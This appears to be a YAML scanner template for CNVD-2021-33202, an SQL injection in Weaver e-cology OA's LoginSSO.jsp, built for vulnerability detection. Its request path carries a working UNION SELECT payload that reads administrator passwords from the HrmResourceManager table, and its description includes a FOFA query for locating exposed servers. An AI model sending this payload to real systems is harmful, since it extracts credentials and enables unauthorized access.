# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<BODY>\r\n<pre>\r\n<code>"
          - "</code>\r\n</pre>\r\n</BODY>\r\n</HTML>"
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager'
id: CNVD-2021-33202
info:
  author: zan8in
  description: |-
    泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等。 泛微e-cology存在SQL注入漏洞。攻击者可利用该漏洞获取敏感信息
    fofa: app="泛微-协同办公OA"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 泛微OA E-Cology LoginSSO.jsp SQL注入漏洞
  severity: high
  tags: cnvd,cnvd2021,sqli,argus-import
